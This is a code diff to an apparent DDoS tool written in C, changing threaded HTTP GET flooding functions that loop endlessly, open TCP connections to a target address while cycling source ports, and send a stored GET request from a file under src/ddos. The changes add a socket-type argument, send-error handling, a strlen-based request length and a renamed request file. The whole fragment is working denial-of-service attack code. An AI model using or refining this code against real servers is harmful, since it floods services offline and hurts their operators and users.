@@ -42,8 +42,6 @@ void* generate_get_flooding1(void *data) {
 	int thread_id = *((int*) data);
 	clock_t thread_clock;
 
-
-
 		while (1) {
 
 		pthread_mutex_lock(&get_mutex);
@@ -54,13 +52,17 @@ void* generate_get_flooding1(void *data) {
 			pthread_cond_broadcast(&get_cond);
 			return 0;
 		}
+
 		int sock = tcp_make_connection(inet_addr(get_src_ip), inet_addr(get_dest_ip),
-					get_src_port, get_dest_port);
+					get_src_port, get_dest_port, SOCK_STREAM);
 			get_src_port++;
 			if(get_src_port >= 65000)
 						get_src_port= 10000;
 
-		send(sock,get_request,__GET_REQUEST_MSG_SIZE__,0);
+		if( (send(sock,get_request,__GET_REQUEST_MSG_SIZE__,0)) <0 )
+		{
+			perror("send error on get \n");
+		}
 
 		get_generated_count++;
 
@@ -97,14 +99,14 @@ void* generate_get_flooding2(void *data) {
 		}
 
 		int sock = tcp_make_connection(inet_addr(get_src_ip), inet_addr(get_dest_ip),
-					get_src_port, get_dest_port);
+					get_src_port, get_dest_port, SOCK_STREAM);
 			get_src_port++;
 			if(get_src_port >= 65000)
 						get_src_port= 10000;
 
 
 
-		send(sock,get_request,__GET_REQUEST_MSG_SIZE__,0);
+		send(sock,get_request,strlen(get_request),0);
 
 		get_produced++;
 		get_total++;
@@ -149,7 +151,7 @@ void get_flood_run(char *argv[], int mode) {
 
 	FILE *get_f;
 
-	get_f=fopen("./src/ddos/http_get_request.txt","rb");
+	get_f=fopen("./src/ddos/http_request.txt","rb");
 	if(get_f==NULL)
 	{
 		perror("open error! does http_get_request.txt exist?\n");
